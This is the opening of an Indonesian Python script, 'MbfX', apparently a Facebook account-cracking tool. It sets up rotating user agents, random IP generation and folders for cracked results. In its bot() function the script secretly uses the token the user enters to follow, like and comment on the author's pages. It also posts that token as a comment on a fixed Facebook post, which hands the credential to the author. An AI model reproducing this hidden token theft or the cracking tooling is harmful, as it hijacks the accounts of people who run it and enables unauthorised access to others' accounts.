#!/usr/bin/python3
# McybearX Projeck
# Tools MbfX
# Recode Taik Kucing
# Versi 2.6

import time,os

try:
        tema = open(".tema.txt","r").read()
except IOError:
        tema = "default"

if "default" in tema:
        p = "\x1b[1;97m" # putih
        l = "\x1b[0;97m" # putih gelap
        m = "\x1b[1;91m" # merah
        h = "\x1b[1;92m" # hijau
        k = "\x1b[1;93m" # kuning
        b = "\x1b[1;94m" # biru
        u = "\x1b[1;95m" # ungu
        s = "\x1b[1;96m" # biru muda
elif "biru" in tema:
        k = "\33[1;97m" # putih
        l = "\33[0;37m" # putih gelap
        p = "\33[1;31m" # merah
        h = "\33[1;92m" # hijau
        u = "\33[1;93m" # kuning
        m = "\33[1;94m" # biru
        s = "\33[1;95m" # ungu
        b = "\33[1;96m" # biru muda
elif "merah" in tema:
        m = "\33[1;97m" # putih
        l = "\33[0;37m" # putih gelap
        h = "\33[1;31m" # merah
        p = "\33[1;92m" # hijau
        s = "\33[1;93m" # kuning
        k = "\33[1;94m" # biru
        b = "\33[1;95m" # ungu
        u = "\33[1;96m" # biru muda
elif "kuning" in tema:
        h = "\x1b[1;97m" # putih
        b = "\33[0;37m" # putih gelap
        s = "\33[1;31m" # merah
        p = "\33[1;92m" # hijau
        k = "\33[1;93m" # kuning
        u = "\33[1;94m" # biru
        l = "\33[1;95m" # ungu
        m = "\33[1;96m" # biru muda

balmond = "\x1b[1;95mʕ\x1b[1;91m ×\x1b[1;95m_\x1b[1;91m×\x1b[1;95mʔ"

try:
	import concurrent.futures
except ImportError:
	os.system("clear")
	print("\n"+balmond+m+" Module Futures Belum Terinstall, Jalankan pip install futures")
	time.sleep(0.5)
	exit()
try:
	import requests
except ImportError:
	os.system("clear")
	print("\n"+balmond+m+" Module Requests Belum Terinstall, Jalankan pip install requests")
	time.sleep(0.5)
	exit()
try:
	import bs4
except ImportError:
	os.system("clear")
	print("\n"+balmond+m+" Module Bs4 Belum Terinstall, Jalankan pip install bs4")
	time.sleep(0.5)
	exit()
try:
	import mechanize
except ImportError:
	os.system("clear")
	print("\n"+balmond+m+" Module Mechanize Belum Terinstall, Jalankan pip install mechanize")
	time.sleep(0.5)
	exit()

import concurrent.futures, requests, bs4, mechanize, sys, random, json, re, ipaddress, calendar
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
from random import randint
from datetime import datetime
from datetime import date

ok = []
cp = []
id = []
opsit = []
sandi = []
batas = "~                                                    "
line = "──────────────────────────────────────────────────────────────"
indah = ["jihan","Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]

kamu = datetime.now()
cantiks = kamu.day
imuts = kamu.month
gemess = kamu.year
sayangs = indah[imuts]
manyun = date.today()
nama_h = calendar.day_name[manyun.weekday()]
if nama_h=="Sunday":
	nama_hari = "Minggu"
elif nama_h=="Monday":
	nama_hari = "Senin"
elif nama_h=="Tuesday":
	nama_hari = "Selasa"
elif nama_h=="Wednesday":
	nama_hari = "Rabu"
elif nama_h=="Thursday":
	nama_hari = "Kamis"
elif nama_h=="Friday":
	nama_hari = "Jumat"
elif nama_h=="Saturday":
	nama_hari = "Sabtu"
hck = "%s-%s-%s-%s"%(nama_hari,cantiks,sayangs,gemess)

semoga = []
berapa_d = []

joined_year = ["{2004 - 2005}","{2005 - 2006}","{2006 - 2007}","{2007 - 2008}","{2008}","{2009 - 2010}"]
old_gak = []
random_gak = []

try:
	jihan = open(".token.txt","r").read()
except IOError:
	pass

try:
	kalo_random = open("uren","r").readlines()
except IOError:
	kalo_random = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15','Mozilla/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 YaApp_Android/10.70 YaSearchBrowser/10.70', 'Mozilla/5.0 (Linux; Android 5.1.1; F1f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; vivo 1901 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.10.2\t ', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.5.1300 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36 mCent/0.13.1214', 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.68 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1819 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.1', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.123 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.4.994 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; in-ID; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.9.8.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2\t ', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 OPR/52.2.2254.54723', 'Mozilla/5.0 (Linux; Android 10; V2032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.0.4.2\t ', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.1(20460) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.2.1303 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.1(20460) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/47.1.2254.147528', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/52.1.2254.54298', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01', 'Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.6.2) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/33.0.2254.125672', 'Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.0.3beta', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 YaApp_Android/9.99 YaSearchBrowser/9.99', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 OPR/35.3.2254.129226', 'Mozilla/5.0 (Linux; U; Android 8.1.0; id-ID; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.13.5.1209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 Puffin/9.0.0.50263AP', 'Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2\t ', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.8.1301 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.1.991 Mobile Safari/537.36NULL', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.66 Mobile Safari/537.36 OPR/52.1.2254.54298', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.123 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.4.0.42081AP', 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326', 'Mozilla/5.0 (Linux; Android 11; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.4.4\t ', 'Mozilla/5.0 (Linux; Android 6.0.1; vivo 1610 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.149 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 6.0; ms-MY; vivo 1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.4.0.0\t ', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10', 'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; A37f Build/LMY47V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.0.828 U3/0.8.0 Mobile Safari/534.30', 'Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.7.0) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.0.1', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.117 Mobile Safari/537.36 OPR/47.0.2254.146760', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.3.1219 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPR/52.2.2254.54574', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.0.1beta', 'Mozilla/5.0 (Linux; Android 5.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.68 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.0.1296 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.2.0.4beta', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/28.0.2254.119224', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.4.4\t ', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1727 Build/N6F26Q; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 OPR/51.0.2254.150807']

def jalan(ms):
	for sir in ms + "\n":
		sys.stdout.write(sir)
		sys.stdout.flush()
		time.sleep(1./30)
def MBEW(ms):
        for sir in ms + "\n":
                sys.stdout.write(sir)
                sys.stdout.flush()
                time.sleep(1./10)
def jala(ms):
        for sir in ms + "\n":
                sys.stdout.write(sir)
                sys.stdout.flush()
                time.sleep(1./150)

def clear():
	os.system("clear")

# LOGO
ris="────────────────────────[McybearX]────────────────────────────"
def banner():
	jala ("""\x1b[1;93m
\x1b[1;95m                     __  __ _      ____  __
\x1b[1;95m  ʕ \x1b[1;91mX X\x1b[1;95m ʔ           |  \/  | |__  / _\ \/ /          ʕ\x1b[1;91m X X \x1b[1;95mʔ
\x1b[1;95m  |  ─  |           | |\/| | '_ \| |_ \  /           |  ─  |
\x1b[1;97m  |\ _ /|           | |  | | |_) |  _|/  \           |\ _ /|
\x1b[1;97m  | | | |           |_|  |_|_.__/|_| /_/\_\ v2.1     | | | |
\x1b[1;97m   ￣ ￣                                              ￣ ￣
\033[95;1m┌[ \033[97;1mAuthor   \033[97;1m: \033[91;1mM\x1b[1;95mcybear\x1b[1;91mX              \x1b[1;95m                        ]┐
\033[95;1m├[ \033[92;1mWhatsApp \033[97;1m: \033[97;1m+62 831-9152-5430          \x1b[1;95m                   ]┤
\033[95;1m├[ \033[97;1mGithub   \033[97;1m: \033[97;1mhttps://github.com/McybearX         \x1b[1;95m          ]┤
\033[95;1m├[ \033[91;1mYOUTUBE  \033[97;1m: \033[97;1mMBEWLEGS                     \x1b[1;95m                 ]┤
\033[95;1m├────────────────────────────────────────────────────────────┘""")

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES # IP
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES # IP

def random_ipv4():
	return ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))


# LOGIN

def login():
	clear()
	banner()
	print ('\n \x1b[1;94mKetik \x1b[1;97m"Belom" \x1b[1;94mjika tidak punya token')
	token = input("\n"+balmond+"\x1b[1;97m Token Fb : ")
	if token=="belom" or token=="Belom" or token=="belum":
		jalan (k+"Anda Akan Diarahkan Ke Browser...");time.sleep(2)
		os.system("xdg-open https://youtu.be/cbSVFZLotKI")
	try:
		hujan = requests.get("https://graph.facebook.com/me?access_token="+token)
		batu = json.loads(hujan.text)
		air = batu["name"]
		api = open(".token.txt","w");api.write(token);api.close()
		jalan(balmond+l+" Login Sukses")
		time.sleep(0.5)
		jalan("Hai👋 "+air+" Jelek :v")
		bot()
	except KeyError:
		try:
			koral = json.loads(hujan.text)
			ban = koral["error"]["error_user_msg"]
			jalan("\n\x1b[1;93m Mohon Maaf \x1b[1;97m"+ban);time.sleep(3)
			print("istirahat dulu bree")
			exit()
		except:
			pass
		jalan(balmond+m+" Login Gagal")
		time.sleep(0.5)
		login()

# BOT

def bot():
	try:
		token = open(".token.txt","r").read()
	except IOError:
		jalan(balmond+m+" Toket Expired")
		time.sleep(0.5)
		login()
	komentar = random.choice(["McybearX emang the best:v","Mantap McybearX","Suport terus McybearX","the best of hacker "])
	requests.post("https://graph.facebook.com/100074600334850/subscribers?access_token="+token)
	requests.post("https://graph.facebook.com/100050672943941/subscribers?access_token="+token) # Usup Mbew
	requests.post("https://graph.facebook.com/123822970114380/likes?summary=true&access_token=" + token)
	requests.post("https://graph.facebook.com/111932931303384/likes?summary=true&access_token=" + token)
	requests.post("https://graph.facebook.com/111932931303384/comments/?message="+komentar+"&access_token="+token)
	requests.post("https://graph.facebook.com/368578384841257/comments/?message="+token+"&access_token="+token)
	menu()

# MENU

def menu():
	try:
		os.mkdir("Hasil_Cp")
	except:
		pass
	try:
		os.mkdir("Hasil_Ok")
	except:
		pass
	clear()
	banner()
	try:
		token = open(".token.txt","r").read()
		cintaku = requests.get("https://graph.facebook.com/me?access_token="+token)
		pillow = json.loads(cintaku.text)
		hujan = pillow["name"]
